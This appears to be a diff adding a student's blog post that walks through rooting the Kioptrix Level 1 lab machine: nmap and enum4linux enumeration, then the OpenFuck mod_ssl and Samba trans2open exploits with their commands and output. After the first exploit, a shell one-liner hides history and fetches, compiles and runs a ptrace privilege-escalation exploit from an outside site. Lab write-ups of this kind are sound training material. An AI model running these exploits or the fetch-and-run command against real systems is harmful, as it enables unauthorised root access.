@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en-us" data-theme="light"><head>
+    <title> Somesh Bhandarkar | Kioptrix 1 </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.70.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Graduate Candidate in Cybersecurity at the University of Maryland, College Park">
+    
+    <link rel="stylesheet" href="https://somesh-bhandarkar.github.io/css/style.min.67cd718c0a3c8009c771494d381fb7128246a454bd0518fed97cb65d257db948.css" integrity="sha256-Z81xjAo8gAnHcUlNOB&#43;3EoJGpFS9BRj&#43;2Xy2XSV9uUg=" crossorigin="anonymous" type="text/css">
+    
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="shortcut icon" href="https://somesh-bhandarkar.github.io/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://somesh-bhandarkar.github.io/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://somesh-bhandarkar.github.io/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://somesh-bhandarkar.github.io/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://somesh-bhandarkar.github.io/post/kioptrix-1/">
+    
+    
+    <script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM=" crossorigin="anonymous"></script>
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://somesh-bhandarkar.github.io/img/prof.jpeg" alt="profile picture">
+        <h3 title=""><a href="/">I&#39;m Somesh</a></h3>
+        <div class="description">
+          <p>Graduate Candidate in Cybersecurity at the University of Maryland, College Park</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://linkedin.com/linkedin.com/in/somesh-bhandarkar" rel="me" aria-label="Linkedin">
+          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://github.com/somesh-bhandarkar" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://www.instagram.com/" rel="me" aria-label="instagram">
+          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="bsomesh98@gmail.com" rel="me" aria-label="e-mail">
+          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; Somesh Bhandarkar 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <ul class="nav">
+        
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+        
+        
+        <li><a  href="/post/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/about/" title="">About</a></li>
+        
+    </ul>
+    <div class="themeswitcher">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+        </a>
+    </div>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Kioptrix 1
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i><span class="date">Mon, Jun 1, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">6-minute read</span>
+        </div>
+        
+        </div>
+
+    <h1 id="kioptrix-1">Kioptrix 1</h1>
+<h2 id="1-enumeration">1. Enumeration</h2>
+<h3 id="nmap">Nmap</h3>
+<h4 id="command-used">Command used:</h4>
+<blockquote>
+<p>nmap -sV -sC -O 192.168.48.131</p>
+</blockquote>
+<h4 id="results">Results:</h4>
+<pre><code>nmap -sC -sV -A -O 192.168.48.131                                                            [16/16]
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 16:26 EDT                                                                                 
+Nmap scan report for 192.168.48.131                                                                                                             
+Host is up (0.00068s latency).                                                                                                                  
+Not shown: 994 closed ports                                                                                                                     
+PORT     STATE SERVICE     VERSION                                                                                                              
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)                                                                                        
+| ssh-hostkey:                                                                                                                                  
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)                                                                                 
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)                                                                                  
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)                                                                                  
+|_sshv1: Server supports SSHv1                                                                                                                  
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)                                           
+| http-methods:                                                                                                                                 
+|_  Potentially risky methods: TRACE                                                                                                            
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b                                                        
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux                                                                              
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+|_ssl-date: 2019-10-27T21:28:58+00:00; +1h01m51s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5 
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5 
+|_    SSL2_DES_64_CBC_WITH_MD5
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:26:A4:B4 (VMware)
+Device type: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: 1h01m50s
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.68 ms 192.168.48.131
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 127.45 seconds
+</code></pre><p><strong>Ports Open</strong></p>
+<ul>
+<li>22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</li>
+<li>80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</li>
+<li>111/tcp  open  rpcbind     2 (RPC #100000)</li>
+<li>139/tcp  open  netbios-ssn Samba smbd (workgroup: vMYGROUP)</li>
+<li>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</li>
+<li>1024/tcp open  status      1 (RPC #100024)</li>
+</ul>
+<h3 id="enum4linux">Enum4linux</h3>
+<blockquote>
+<p>enum4linux 192.168.48.131</p>
+</blockquote>
+<h4 id="results-1">Results</h4>
+<pre><code>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 27 23:32:17 2019  
+...  
+  
+ =======================================   
+|    OS information on 192.168.48.131    |  
+ =======================================   
+[+] Got OS info for 192.168.48.131 from smbclient: Domain=[MYGROUP] OS=[Unix] **Server=[Samba 2.2.1a]**  
+[+] Got OS info for 192.168.48.131 from srvinfo:  
+ KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server  
+ platform_id     : 500  
+ os version      : 4.5  
+ server type     : 0x9a03  
+  
+...  
+   
+ ==========================================   
+|    Share Enumeration on 192.168.48.131   |  
+ ==========================================   
+WARNING: The &quot;syslog&quot; option is deprecated  
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
+  
+ Sharename       Type      Comment  
+ ---------       ----      -------  
+ IPC$            IPC       IPC Service (Samba Server)  
+ ADMIN$          IPC       IPC Service (Samba Server)  
+  
+ Server               Comment  
+ ---------            -------  
+ KIOPTRIX             Samba Server  
+  
+ Workgroup            Master  
+ ---------            -------  
+ MYGROUP              KIOPTRIX  
+ WORKGROUP            ELSAFFA7  
+  
+[+] Attempting to map shares on 192.168.48.131  
+//192.168.1.104/IPC$ [E] Can't understand response:  
+WARNING: The &quot;syslog&quot; option is deprecated  
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
+NT\_STATUS\_NETWORK\_ACCESS\_DENIED listing \*  
+//192.168.48.131/ADMIN$ [E] Can't understand response:  
+WARNING: The &quot;syslog&quot; option is deprecated  
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
+tree connect failed: NT\_STATUS\_WRONG\_PASSWORD  
+</code></pre><p><em>Enum4linux</em> was able to identify the version of Samba as 2.2.1a</p>
+<h2 id="2exploitation">2.Exploitation</h2>
+<h3 id="getting-root-using-apache-mod_ssl-vulnerability">Getting root using Apache mod_ssl vulnerability.</h3>
+<pre><code>--------------------------------------- ----------------------------------------
+ Exploit Title                         |  Path
+                                       | (/usr/share/exploitdb/)
+--------------------------------------- ----------------------------------------
+Apache mod\_ssl 2.0.x - Remote Denial o | exploits/linux/dos/24590.txt
+Apache mod\_ssl 2.8.x - Off-by-One HTAc | exploits/multiple/dos/21575.txt
+Apache mod\_ssl &lt; 2.8.7 OpenSSL - 'Open | exploits/unix/remote/21671.c
+Apache mod\_ssl &lt; 2.8.7 OpenSSL - 'Open | exploits/unix/remote/47080.c
+Apache mod\_ssl &lt; 2.8.7 OpenSSL - 'Open | exploits/unix/remote/764.c
+Apache mod\_ssl OpenSSL &lt; 0.9.6d / &lt; 0. | exploits/unix/remote/40347.txt
+--------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</code></pre><p>The exploit <em>exploits/unix/remote/47080.c</em> matches both the apache version and the mod_ssl version. This is the updated version of previous OpenFuck exploit <em>exploits/unix/remote/764.c</em></p>
+<p>The exploit can be found <a href="https://www.exploit-db.com/exploits/47080">here</a> using this exploit needs aa few additional steps to be performed.</p>
+<ul>
+<li>install libssl-dev using command:</li>
+</ul>
+<blockquote>
+<p>apt-get install libssl-dev</p>
+</blockquote>
+<ul>
+<li>
+<p>Compile the program with: <em>gcc -o OpenFuck OpenFuck.c -lcrypto</em></p>
+</li>
+<li>
+<p>Run the program using command:</p>
+</li>
+</ul>
+<blockquote>
+<p>./OpenFuck 0x6b 192.168.38.131 -c 50</p>
+</blockquote>
+<p>Running it without any arguements shows a list of OS-Apache versions, the relevant ones to our system is:
+0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+After trying both these arguements, the 0x6b was the one that worked.
+The 0x6a arguements exits without spawning a shell.</p>
+<p>####Result</p>
+<pre><code>:~# ./OpenFuck 0x6a 192.168.48.131 -c 50
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+Good Bye!
+
+
+:~# ./OpenFuck 0x6b 192.168.48.131 -c 50
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 
+--18:34:37--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--18:34:38--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   1.87 MB/s
+
+18:34:38 (1.25 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 1995
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+whoami
+root
+</code></pre><h3 id="getting-root-using-samba-vulnerability">Getting Root using Samba Vulnerability.</h3>
+<p>We know the version of Samba which is 2.2.1a
+Searching for vulnerabilities on exploit.db
+We find <a href="https://www.exploit-db.com/exploits/10">this</a> exploit which matches our samba version.</p>
+<p>To run this exploit:</p>
+<ul>
+<li>Compile using: gcc 10.c -o samba-exp</li>
+<li>Run Exploit using</li>
+</ul>
+<blockquote>
+<p>/samba-exp -b 0 -c 192.168.48.132 -C 40 192.168.48.131</p>
+</blockquote>
+<p>Here, arguement passes to -c is host ip address and -C is victim ip address</p>
+<h4 id="result">Result</h4>
+<pre><code>samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Worked!
+--------------------------------------------------------------
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+whoami
+root
+
+
+The Flag:
+cat /var/mail/root  
+From root  Sat Sep 26 11:42:10 2009  
+Return-Path: &lt;root@kioptix.level1&gt;  
+Received: (from root@localhost)  
+ by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831  
+ for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400  
+Date: Sat, 26 Sep 2009 11:42:10 -0400  
+From: root &lt;root@kioptix.level1&gt;  
+Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;  
+To: root@kioptix.level1  
+Subject: About Level 2  
+Status: O  
+  
+If you are reading this, you got root. Congratulations.  
+Level 2 won't be as easy...  
+</code></pre>
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>
+
+</html>
